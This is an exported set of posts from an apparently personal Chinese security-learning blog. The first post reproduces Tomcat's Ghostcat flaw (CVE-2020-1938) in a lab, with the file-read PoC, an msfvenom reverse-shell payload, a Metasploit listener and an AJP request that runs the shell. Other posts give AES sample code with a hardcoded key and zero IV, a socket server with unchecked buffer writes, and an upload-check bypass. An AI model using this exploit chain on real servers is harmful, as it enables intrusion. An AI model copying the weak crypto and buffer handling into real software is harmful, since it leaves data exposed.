{"posts":[{"title":" CVE-2020-1938 幽灵猫漏洞RCE 复现","content":"漏洞原理作为一个菜鸡的我目前还不是很懂，但是这里记录一下，在之后一段过程的学习之后，希望能够回头看懂。→传送门。 一、任意文件读取复现 POC不多说，直接去github上就可以下载，任意文件读取的方式也比较简单，代码只有一行： python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f &quot;/WEB-INF/web.hml&quot; 192.168.0.1 -p &lt;端口&gt; -f&lt;文件路径&gt; ，这里应为该漏洞的原因，AJP协议所使用的是8009端口，所以是固定值，只需要对其他两个参数进行修改即可，输入“-h”可以查看该POC的帮助信息，大佬果然还是想的全面的。 二、命令执行 这里我采用的方式是使用msf生成反弹马，简洁又方便~~（其实是我只会这个）~~。 1.使用msf生成反弹shell马 这个就不用过多解释了： msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.2 LPORT=4567 R &gt;shell.png 所使用的payload类型选择 “java/jsp_shell_reverse_tcp ”，之后是反弹的IP和端口，至于后面那个“R”是什么我也不清楚，这个我需要查一下。之后有空学习这方面的时候，应该是会有一篇专门的总结的，这里也记录一下提醒自己。 2.在msf启动监听 这里主要是命令操作msf，也进行简单的记录 use exploit/multi/handler set LHOST 127.0.0.1 set LPORT 9999 set payload java/jsp_shell_reverse_tcp show options 先选择我们使用的模块，然后设定监听的IP和端口，选择我们的payload，最后查看一下设置，是我个人习惯，毕竟确定一下不是什么坏事。这里就等待执行就可以了。 3.构造AJP包 这里也是今天才学会的，用到的是AJP包构造器ajpfuzzer。 java -har ajpfuzzer_v0.6.har connect 192.168.0.2 8009 运行指令： forwardrequest 2 &quot;HTTP/1.1&quot; &quot;/123.jsp&quot; 127.0.0.1 127.0.0.1 porto 8009 false &quot;Cookie:AAAA=BBBB&quot;,&quot;Accept-Encoding:identity&quot; &quot;javax.servlet.include.request_uri:11.jsp&quot;,&quot;javax.servlet.include.path_info:/WEB-INF/shell.png&quot;,&quot;javax.servlet.include.servlet_path:/&quot; 指令中“/123.jsp”是一个该web项目中没有的jsp文件，这样tomcat才会去调用存在漏洞的地方，&quot;/WEB-INF/shell.png&quot;为自己的马上传的文件路径。 4.得到shell 都已经准备完毕了，享受最后成果：运行msf开始监听，然后发送之前构造好的包，即可得到shell。 这里收到连接之后由于太久没用，傻掉了，连接回来之后是可以进行下一步操作的，我这里等到连接都断开了还以为没连接成功 = =，尴尬，第二次连接回来才想起来用shell命令。 总结 总的来说，这次是第一次尝试复现CVE漏洞，一是因为一个好的机遇遇到了能做题的环境，二是关注到了最近所爆出的大型漏洞，所以第一时间想到了。感觉还是比较舒服的，也挺有成就感的，所以这里专门记录了下来，美中不足的是这次没有尝试提权。希望在之后的学习过程中，自己能够看懂这个漏洞产生的原因，以及写出自己的POC，能够自己独立完成一系列工作。 ","link":"https://guy-Fawke.github.io/post/CVE/"},{"title":"使用Openssl库函数实现AES加密","content":" 之前在学习TCP/IP网络编程，涉及到客户端和服务器之间的加密通信，那给通信加密就是一件必然的事情了。之前学习加密算法，也是只在一门选修课上，荣幸的听教授讲解了一下，着实已经忘得差不多了，晚上的时候没事拿出之前的书看了一下，AES简单来说，总体加密过程就是结合秘钥，将置换和位置变换结合起来，形成了一种加密算法。 一、调用openssl库实行AES加密（PKCS7填充CBC模式) AES这其中有分有很多种模式，这里就不过多的做解释了，我们今天这里所使用的方式是ASES的PKCS7标准填充方式哈哈，依旧按照我的习惯选择了最方便的一种，采用CBC模式进行的加密。AES总归是一个模块化的加密算法，我们所采用的CBC模式说简单了就是前一个加密模块的内容会成为后续模块加密过程中的一部分，至于具体完整的加密流程，想要学习的人可以自行百度，由于着急使用，所以选择了一种较为简单直接的openssl函数库实现的，首先我们贴上一些接口函数 // 设置加解密秘钥 int AES_set_encrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key); int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key); AES_KEY aes; AES_set_encrypt_key(key,128,&amp;aes); // 这里填写的128是bit位，128bit=(128/8)bytes=16bytes，这个换算和32bit对应int为内存指针的原理一样。 // 加密函数 # define AES_ENCRYPT 1 // aes.h 63 lines # define AES_DECRYPT 0 // aes.h 64 line void AES_cbc_encrypt(const unsigned char *in, unsigned char *out, size_t length, const AES_KEY *key, unsigned char *ivec, const int enc); // 定义一个加密的初始化偏移向量 unsigned char iv[16]； // 加密 AES_cbc_encrypt(raw_buf,encrypt_buf,buf_size,&amp;aes,iv,AES_ENCRYPT); // 解密 AES_cbc_encrypt(raw_buf,encrypt_buf,buf_size,&amp;aes,iv,AES_DECRYPT); 这是接口函数，总体来说还是比较简单直接的，只需要传入需要加解密的字符地址，存放结果的地址，传入数据的大小，秘钥，偏移向量，和约定好的加解密Flag即可。 之后这段代码是我在网上找到的，稍做了一些修改，让它更加的完整了一些，原地址在这里。 // main.c #include &lt;openssl/aes.h&gt; #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;assert.h&gt; #include &lt;stdlib.h&gt; // 填充函数，将传入的字符串内容填充为16的整数倍 unsigned char *padding_buf(unsigned char *buf, int size, int *final_size) { unsigned char *ret = NULL; int pidding_size = AES_BLOCK_SIZE - (size % AES_BLOCK_SIZE); int i; *final_size = size + pidding_size; ret = (unsigned char *)malloc(size + pidding_size); memcpy(ret, buf, size); if (pidding_size != 0) { for (i = size; i &lt; (size + pidding_size); i++) { //// zero padding算法： //ret[i] = 0; // PKCS7Padding算法 ret[i] = pidding_size; } } return ret; } // 这里是大佬里面带的打印函数，因为确实比较直观我就保留了下来，这样可以较为清楚的看到填充过程 void printf_buff(unsigned char *buff, int size) { int i = 0; for (i = 0; i &lt; size; i++) { printf(&quot;%02X &quot;, (unsigned char)buff[i]); if ((i + 1) % 8 == 0) { printf(&quot;\\n&quot;); } } printf(&quot;\\n\\n\\n\\n&quot;); } // 因为库函数的接口地方加解密就使用同一个，这里我就直接卸载一起了 // 同时设置了一个长度值，用于获取加解密之后的长度结果 // 当然，其实加密的时候，我们已经通过填充得到了加密的结果，这里主要还是解密后的内容 void AES_AES(unsigned char *raw_buf, unsigned char *encrpy_buf, int len, int &amp;Final, int flag) { // 初始化秘钥和便宜 AES_KEY aes; unsigned char key_temp[] = &quot;1111111111111111&quot;; unsigned char iv_temp[16] = { 0 }; if (flag == 1) { Final = len; AES_set_encrypt_key(key_temp, 128, &amp;aes); AES_cbc_encrypt(raw_buf, encrpy_buf, len, &amp;aes, iv_temp, AES_ENCRYPT); } else { // 解密过程中因为之前采取的填充模式为 // 加密字符串不足16的整数倍时，若缺N个字节，则填充N。 // 所以这里获取加密前字符长度的方式就是 // 读取解密结果的最后一个字节就知道填充了多少 int add; AES_set_decrypt_key(key_temp, 128, &amp;aes); AES_cbc_encrypt(raw_buf, encrpy_buf, len, &amp;aes, iv_temp, AES_DECRYPT); add = encrpy_buf[len - 1]; Final = len - add; } } int main(int argn, char *argv[]) { unsigned char *after_padding_buf = NULL; int padding_size = 0; unsigned char *encrypt_buf = NULL; unsigned char *decrypt_buf = NULL; unsigned char original_content[] = &quot;All is Well !!&quot;; int length_Of_result; // original_content printf(&quot;------------------raw_buf\\n&quot;); printf_buff(original_content, strlen((char*)original_content)); // after_padding after_padding_buf = padding_buf(original_content, strlen((char*)original_content), &amp;padding_size); printf(&quot;------------------after_padding_buf\\n&quot;); printf_buff(after_padding_buf, padding_size); // encrypted encrypt_buf = (unsigned char *)malloc(padding_size); AES_AES(after_padding_buf, encrypt_buf, padding_size, length_Of_result, 1); printf(&quot;------------------encrypt_buf\\n&quot;); printf_buff(encrypt_buf, padding_size); // decrypted decrypt_buf = (unsigned char *)malloc(padding_size); AES_AES(encrypt_buf, decrypt_buf, padding_size, length_Of_result, 0); printf(&quot;------------------decrypt_buf\\n&quot;); printf_buff(decrypt_buf, padding_size); printf(&quot;------------------decrypt_buf2\\n&quot;); printf_buff(decrypt_buf, length_Of_result); // 保持一个良好的释放习惯 delete[]after_padding_buf; delete[]encrypt_buf; delete[]decrypt_buf; return 0; } 这个代码写的还是比较清晰易懂的，所以接下来就没有过多的解释了，这里直接贴出结果。 因为我们输入的内容为&quot;All is Well !!&quot;，共计14个字节，所以填充时在末尾补入02至16个字节，之后进行加解密，这里就比较直观能看出，这里我也最终打印出了两个解密结果，一个是直接解密后的结果，可以看到末尾就是填充的字符数，只需要简单计算后就可得到加密前原始数据的长度了。 二、配置openssl库 思来想去还是决定把openssl这个库函数的配置过程记录下来。Openssl官网下载哈哈，然而我并不是在管网直接下的，当时我找到的是这里！！！。那我这里就简单的讲一下我配置的过程。 根据所要生成的文件是X64还是X86的选择对应的版本，进行安装，安装的时候记清楚自己的安装路径。 在VS2017中添加之前下载好的函数库路径。 添加索要用到的静态链接库 将所需的动态链接库拷贝到文件夹中。 总结 选择用Openssl实现AES加密，也是我第一次尝试对数据内容加密，总体来说因为实现过程较为简单，所以还是非常顺利的，当时因为脑袋卡克，在解密之后计算原始数据长度的时候居然一时没有想到，哈哈，也是非常尴尬的。调用函数库实现加密，给了我们极大的便利，但是同样也值得我们注意的是，首先因为函数库的关系，调用AES头文件和链接库，在静态编译的过程中会加大所编译文件的大小；其次，由于Openssl函数库的强大功能，使得它在使用时不得不带着两个动态链接库，我最后改掉这个加密也是因为这个原因，带着所需要的动态库实在是让我有点难受。总体来说有舍有得，在本地加密时，确实也是一个不错的选择！！便于偷懒。 ","link":"https://guy-Fawke.github.io/post/AES/"},{"title":"基于socket的S/C计算器","content":" 这两天属实是非常的忙，而且干的都是搬砖的活，说自己有一些收货吧，感觉又没学到什么，毕竟是东拼西凑，说自己什么都没学到吧，有感觉还是懂得了一些东西的。这两天终于是抽空看了会书，感触比较深的就是这个基于简单socket的计算器。当然，只是简单的实现了个小的加减乘，本来也不是为了练习计算，而是 从头学习Socket连接。 这里先贴上代码，具体内容里面是有注释的，所以不做过多的解释。 服务器： /*********************************************************************** **Project : Remote_Calculator **author : Guy_Fawkes **Time : 2020.03.06 ***********************************************************************/ #include &lt;stdio.h&gt; #include &lt;iostream&gt; #include &lt;winsock2.h&gt; /********************计算函数**********************************/ //因为计算部分并不是重点。这里只是最简单的实现了一下而已 int calculate(int number_of_calculate, int opnds[], char op) { int result = opnds[0], i; switch (op) { case '+': for (i = 1; i &lt; number_of_calculate; i++) result += opnds[i]; break; case '-': for (i = 1; i &lt; number_of_calculate; i++) result -= opnds[i]; break; case '*': for (i = 1; i &lt; number_of_calculate; i++) result *= opnds[i]; break; } return result; } int main() { // 声明所需的变量，内容包括两个SDOCKET 和一个 WSAdata // 两个地址和一个地址长度，这是个人习惯，不一定要一致 SOCKET Slisten, Saccept; WSADATA wsaData; SOCKADDR_IN servAddr, clntAddr; int szClintAddr; // 首先启动socket if (WSAStartup(MAKEWORD(2, 2), &amp;wsaData) != 0) { printf(&quot;WSAstart up Filed!!\\n&quot;); return 0; } // 建立监听套接字 Slisten = socket(AF_INET, SOCK_STREAM, 0); if (Slisten == INVALID_SOCKET) { printf(&quot;socket() Error !!\\n&quot;); return 0; } // 初始化地址内容 memset(&amp;servAddr, 0, sizeof(servAddr)); servAddr.sin_family = AF_INET; servAddr.sin_addr.s_addr = htonl(INADDR_ANY); servAddr.sin_port = htons(4567); // 将地址内容和socket绑定 if (bind(Slisten, (SOCKADDR*)&amp;servAddr, sizeof(servAddr)) == SOCKET_ERROR) { printf(&quot;bind socket Error\\n&quot;); return 0; } // 设定监听队列 if (listen(Slisten, 2) == SOCKET_ERROR) { printf(&quot;listen Error!!&quot;); return 0; } // 开启循环接受链接队列中的内容，尝试进行数据处理 szClintAddr = sizeof(servAddr); char buff[1024]; while (true) { // 建立接受套接字 Saccept = accept(Slisten, (SOCKADDR*)&amp;servAddr, &amp;szClintAddr); if (Saccept == SOCKET_ERROR) { printf(&quot;accept() Error&quot;); return 0; } // 第一步，接受要运算的数字个数 char number_of_calculate ; recv(Saccept, (char *)&amp;number_of_calculate, 1, 0); /*循环接受要计算的内容，这里实现的方法是比较多的 我还是选择了跟书上较为相似的一种方式进行 主要内容是recv函数的第二个参数，也就是接受地址的起始位置*/ int recLength = 0; while ((number_of_calculate * 4 +1)&gt;recLength) { int nRcve = recv(Saccept, &amp;buff[recLength], 1024, 0); recLength += nRcve; } //进行简单的计算并传递回去 int result = calculate(number_of_calculate, (int *)buff, buff[recLength - 1]); send(Saccept, (char*)&amp;result, sizeof(result), 0); closesocket(Saccept); } closesocket(Slisten); WSACleanup(); return 0; } 客户端： #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;iostream&gt; #include &lt;winsock2.h&gt; int main() { SOCKET Csocket; WSADATA WSAData; SOCKADDR_IN client_addr; if (WSAStartup(MAKEWORD(2, 2), &amp;WSAData) != 0) { printf(&quot;WSAstartUp Error !!!\\n&quot;); return 0; } memset(&amp;client_addr, 0, sizeof(client_addr)); client_addr.sin_family = AF_INET; client_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); client_addr.sin_port = htons(4567); Csocket = socket(AF_INET, SOCK_STREAM, 0); if (Csocket == SOCKET_ERROR) { OutputDebugStringA(&quot;socket Error!!&quot;); return 0; } if (connect(Csocket,(SOCKADDR*)&amp;client_addr,sizeof(client_addr))== SOCKET_ERROR) { OutputDebugStringA(&quot;connect socket error&quot;); return 0; } //之前的内容基本和服务器相似，不做过多解释和记录 char buff[1024]; int number; printf(&quot;Number of Numbers to calculate:&quot;); scanf_s(&quot;%d&quot;, &amp;number); //在第一个字节处存储参与运算的数字个数 buff[0] = (char)number; for (int i=0;i&lt;number;i++) { printf(&quot; operand %d:&quot;, i + 1); //以int类型向buff中存储数字，每次开头的地址是之后的第五个字节 //也就是说，从第二个字节开始，每隔四个字节存入一个运算数 scanf_s(&quot;%d&quot;, (int *)&amp;buff[i * 4 + 1]); } printf(&quot;Input operator:&quot;); //（+1）为第一个 记录个数的char （number*4）是操作数的地址 //在最后的位置存入运算符 scanf_s(&quot;%c&quot;, &amp;buff[(number * 4 + 1)]); //发送输入的内容，大小为 数字个数*4 + 两个char send(Csocket, buff, (number * 4 + 2), 0); // 等待接收结果,设计直接以一个整型接收 int result; recv(Csocket, (char*)&amp;result, 4, 0); //打印结果关闭套接字 printf(&quot;Operation Result is : %d\\n&quot;, result); closesocket(Csocket); WSACleanup(); return 0; } 其实在这个客户端中输入是有讲究的，因为输入的内容是一个只有一字节的运算个数N，和N个【int】（我的是四字节）四字节的运算数，和一个char类型的运算码，我写的时候也没有多想，就直接按照之前的想法进行了，但是在最后运行测试的时候是出现了一些问题的。 对，大家应该很容易能看出来，就是在输入最后一个运算数的时候，我的运算码必须紧跟着输入，这个原因是因为我没有考虑换行符其实是会占位置的，所以在格式化输入的时候自动读取了第三个操作数之后的一个字节的内容，如果之后跟的是换行符的话是会自动填入这个地址中的，因为我觉得这是个收获也是个提醒，所以并没有以对这里进行修改。 传输时的内存空间 这里以我拙劣的画技，简单以两个操作数 “1”，“2” 进行加法运算为例，简单的画出了传输时的布局图，这里虽然最终是用的一个char数组进行的传递，但是其中包含的操作数是以int来存储的，仔细想一下还是比较有意思的。 总结 简单总结一下这个学习内容，首先就是简单的Socket，看书的时候感觉自己确实是都看懂了，但是合上书本自己动手写的时候，确实还是非常难受的，总会在各种细节方面出现意想不到的问题； 第二点也是让我收获最大的一点，就是传输时的内存空间，让我明白了一个道理： 计算机并不需要知道函数传入或者你输入的是什么类型什么格式，你只要能让它明白在哪个地址，按多少位进行读取，一共读取多长。 只要这一点设定好了，不管最终类型是什么样的，总是能够正确的使用这些内容； 最后一点就是，对于计算机来说，不管是渗透测试还是学习其他的内容，最终都会回归编程，最终都会回归到最基础的内容。网络编程就要确实理解计算机网络，理解TCP/IP，其他编程最终都逃不过汇编语言，躲不开操作系统，所以基础知识自己还是需要不断地去学习和巩固。 ","link":"https://guy-Fawke.github.io/post/Socket/"},{"title":"文件上传漏洞之客户端检测绕过","content":" 这里不得不提一下，就目前大家电脑知识普遍提升的情况下，前端的检测显得越来越苍白无力了……不过作为文件上传漏洞的最基础问题，还是非常值得入门时了解学习的。这里的客户端检测仅指针对文件上传这一问题而言的，不用想太多。 对于客户端的概念就不做过多解释了，如果你不想仔细了解，这里就把它当做你的浏览器就可以了，所以此时这个问题就转换成了你自己的浏览器，对你上传的文件进行检测。这不就变成了自己对自己的检查嘛！！!所以之前说这项检测说到底并没有什么*用。 今天以Upload-Labs (也就是一个文件上传漏洞学习的集合)的第一关为例进行学习，解题方法并不是唯一的，这里我们主要是用来学习最基础的这种概念和方式。首先根据提示我们可以很清楚的知道这是一个客户端使用Js对不合法的图片进行的检查。抱着学习的态度我们依次上传一个Webshell和一个图片，对其反馈结果做一个简单的对比。 传入一个php文件： 传入一个jpg文件： 此时两种文件的返回结果还是十分明显的，同时这也表现出了一个比较典型的前端检测的方式，那就是弹窗提醒。我们可以很轻松的知道，此时并不需要查看后端代码，也不需要抓包进行修改等，这时候以最应该做的是：看我之前的那篇文章，查看当前页面的源码🤙【手动狗头】。 这里我们着重找到 onsubmit 事件。前端的JavaScript检测绕过主要有两个事件 onchange ： 事件会在域的内容改变时发生，也可用于单选框复选框改变后触发的事件。 onsubmit ：事件会在表单中确认按钮被点击时触发（也就是在表单提交时触发）onsubmit处理函数返回false不会引起表单的提交。 删掉之后再次点击上传，此时由于并没有触发后续的检测函数，所以文件直接上传成功了，也不会有弹窗进行提示和检测。 我们跟进onsubmit触发的checkFile()函数： 可以看到这里是采用的白名单的检测方式，仅仅定义了三个允许上传的文件类型，在有些时候我们同样能找到前端JavaScript代码中对允许上传的文件类型定义的函数，在这里将想要上传的文件函数后缀加入白名单中，也可以实现绕过检测，这道题由于这里是对配置文件进行引用，在白名单部分并不是真正的前端，所以无法修改，如果大家遇到了可以进行尝试。 总结： 文件上传在前端检测方面是比较简单的，因为是自己对自己进行检测，对于前端来说，还有一种非常典型的为，按键或者文本框是灰色的，无法使用，这里没有专门找例子进行讲解，如果在遇到的时候只需要找到对应的前端触发函数进行删除就可以了，同样也非常简单。而这里作为文件上传的第一个学习科目还是容易让人有成就感的，哈哈。 ","link":"https://guy-Fawke.github.io/post/upload_JS/"},{"title":"CTF入门—一场查看网页源代码的博弈","content":" 为什么会有一个这么奇怪的标题呢，这事要从我开始学习Web安全说起。在初学CTF之时询问了大佬们学哪个方面有前途，大佬们的回答千奇百怪，在考虑了我还是更喜欢对着界面看到成效的这种感觉，最终还是决定向Web方向发展一下，所以这就开始了我的渗透测试学习。学习是基于这个网站的---&gt;攻防世界，这里也推荐给大家，可以和自己的小伙伴组建战队，一起学习进步🤜🤛。 今天要说的这场博弈呢，就是这个练习靶场的Web基础题第一题: 这是一道非常基础的题，想要学习Web，首先就要学会的是查看网页的源代码，几种查看网页源代码的方式都十分简单，这里就不过多解释了，简单列出来： 通过点击鼠标右键查看网页源代码。 通过点击鼠标右键查看元素，精准定位到元素位置，同时查看到网页代码。 在地址栏中输入 view-source:+URL查看网页源代码，Eg view-source:http://baidu.com 即可查看百度的页面源码。 点击键盘上的F12，直接查看网页源代码。 这几种查看网页源代码的方式所得到的的结果是有所区别的，用方法4得到的是未经过浏览器解析的网页源代码，其他三种方式是浏览器解析后的网页源代码，这里就不过多解释了，想要具体了解的朋友可以继续再查看相关资料~~（其实百度百度就能明白）~~。 当然，如果故事到这里就结束了未免也太水了一点，拿到Flag之后的我非常好奇，这是怎么做到的呢？为什么禁止了我的鼠标右键呢，不久之后遇到一个页面，也禁止了我使用F12查看源码，这里就让我十分的不开心了，所以就专门去学习了一下如何禁用鼠标右键和F12查看源码，这里记录下来，和大家一起学习。（涉及到一定的前端知识，我也没有系统学过，可能不能写的很清楚）。 （一）、禁止使用鼠标： &lt;script&gt; function stop(){ return false; } document.documentElement.oncontextmenu=stop; document.documentElement.ondragstart=stop; document.documentElement.onselectstart=stop; &lt;/script&gt; 简单进行解释如下： 首先介绍一个概念 Document对象 当浏览器载入 HTML 文档, 它就会成为 Document 对象。 Document 对象是 HTML 文档的根节点。 Document 对象使我们可以从脚本中对 HTML 页面中的所有元素进行访问。 提示：Document 对象是 Window 对象的一部分，可通过 window.document 属性对其进行访问。 简答来说，当你浏览网页的时候，你所操纵的浏览器对于这个网页来说就是一个Document对象。 ​ 其次解释之后的三个事件 oncontextmenu ：当点击右击鼠标时执行 JavaScript ondragstart ：当开始拖动元素时执行JavaScript onselectstart ：触发时间为目标对象被开始选中时（即选中动作刚开始，尚未实质性被选中） 显然，当发生这三个事件的时候会调用stop()，进而返回一个False，这里包括鼠标右键点击和左键选中，所以会使得我们无法使用鼠标（包括左右键），于此类似的还有下面这段代码： &lt;script language=&quot;JavaScript&quot;&gt; document.oncontextmenu=new Function(&quot;event.returnValue=false;&quot;); document.onselectstart=new Function(&quot;event.returnValue=false;&quot;); &lt;/script&gt; （二）、禁止使用F12查看源代码 这里使用的方式和之前大致一样，就是对按键的禁用，只需要在按下F12时将它的按键码转换为 0 即可，展示代码: &lt;script type=&quot;text/javascript&quot;&gt; document.onkeydown = function () { if (window.event &amp;&amp; window.event.keyCode == 123) { event.keyCode = 0; event.returnValue = false; return false; } }; &lt;/script&gt; 从这个事件的名字我们显而易见onkeydown： onkeydown 事件会在用户按下一个键盘按键时发生。 至于判断条件内的keyCode: keyCode 属性返回onkeypress事件触发的键的值的字符代码，或者 onkeydown 或 onkeyup 事件的键的代码。 值得一提的是，字符代码和键代码是有所区别的，两种类型的值不是都相等的，比如说小写字符 &quot;w&quot; 和大写字符 &quot;W&quot; 有相同的键盘代码，因为他们键盘上的同一个位置 ( &quot;W&quot; 代码为 &quot;87&quot;)，但是它们有不同的字符代码，两个字符输出是不一样的( &quot;w&quot; 和 &quot;W&quot; 字符代码为 &quot;119&quot; 和 &quot;87&quot;)，这里有个建议，如果需要知道用户按下的是有明显输入内容，不太需要区分大小的打印键 (如 &quot;a&quot; 或 &quot;5&quot;)，建议使用 onkeypress 事件。如果需要知道用户按下的是功能键(如 &quot;F12&quot;, &quot;Home&quot;) 可使用 onkeydown 或 onkeyup 事件，这样可以在按下的瞬间或者松开的瞬间执行。 下面贴上键码对照表（可能有一丢丢不清楚，可以百度直接搜索）： ","link":"https://guy-Fawke.github.io/post/查看源码博弈/"},{"title":" 使用Gridea基于GitHub搭建自己的博客","content":" 思考良久，决定第一篇还是记录一下自己创建博客的过程。很久之前就想有个自己的博客了，用来记录自己的学习过程，写在其他平台那些花里胡哨的广告自己又十分的不喜欢，这两天终于努努力把它实现了。其中搜索了一些资料但是也踩了很多坑，所以这里记录下来，也为以后需要的人提供经验。当然了，初次写文章，可能还会比较混乱，我也会多加努力，一步步做到更好。 我选的这个方式呢应该说是最简单的一种了，基本上点点鼠标就能实现，不足之处就是没有太多自己创造的方面，当然如果你有一定的前端能力，也是可以一点点扩展的。但如果你跟我一样只是需要一个能写文章的地方，而且没有太强的前端技能，那这种方式会很适合你。 一、建立自己的Github账号和仓库 因为实第一篇文章，当然要从最简单的开始讲起，所以我们先开始建立一个Github账号并建立一个仓库。这种时候你只需要点击这里---&gt;Github直通车 之后会有一个简单的人机认证，和选择付费还是免费的内容，这里大多数情况下使用免费的Github就能够满足大家的使用要求了。最后只需要根据自己的情况很轻松你就能拥有一个自己的Github账号了。 有了账号之后当然是要创建一个Repositories，也就是一个仓库来存储自己博客，点击这里的New。 接着写下自己的仓库名，我的已经建立了所以会报错，这里按照建议填的话会比较方便，这样Github会自动建立一个GitHub Pages会更为方便 (我承认我比较懒) ，当然也算是我不小心踩到的一个坑，如果只是一个空仓库的话他不会建立分支和其他内容，就需要自己去设置里将这个仓库变为一个GitHub pages，在这就不过多解释了， 接下来就可以轻松的开始我们的第二步了。 二、生成Token和生成页面 这里我也是看着别人学习的，大佬写的非常的详细所以把大佬的教学博客贴过来供大家学习和参考，同时当做自己的学费----&gt;&gt; 看搭建过程点这里！！！ 这篇文章的最后有其他的一些搭建方式，所以如果想学习了解，或者完全自主的搭建自己的博客的话，可以看他最下面推荐的几种方式。 我主要想写一个非常大的坑，如果不看上面的教程可能会有点莫名其妙。 在这里检测远程连接的时候，很多人即使填对了所有的信息之后也容易一直连接失败，我因为这个问题搞了很久很久，甚至陷入了对自己深深的怀疑……如果你确定所有信息尤其是Token没有填错的话，就可以继续往下看了。 ------------------听说在新发布的最新版已经更正了错误，不知道还有没有用----------------- 1. 去自己的Github仓库复制你的git连接。 2. 找到Gridea的文件夹（一般在文档下面），找到output文件夹打开 3. 空白处右键打开Git Bash 4. 输入以下命令回车 git remote add origin &quot;仓库的git命令地址&quot; (只是一个命令就不贴图啦)之后再返回点击远程测试，如果不出意外的话就能成功连接了。 总结 我也是这两天刚刚开始使用Gridea并且搭建起了自己的博客，总体来说过程磕磕绊绊但是结果还是很好的。这个软件还比较小众，内在的设计大家可以自己再去没事点一点研究一下，如果有好的使用技巧也欢迎能够分享。我个人认为，有一点不足就是我不知道为什么目前没办法用其他的Markdown编译器来写自己的博客，后续如果成功了还会再来更新自己的使用方法，这里当然要推荐我比较喜欢的一款编辑器啦！！Typora 边写边预览，小巧又轻便，哈哈，和我用来搭建博客的软件一样哦。 ","link":"https://guy-Fawke.github.io/post/Make_Gridea/"}]}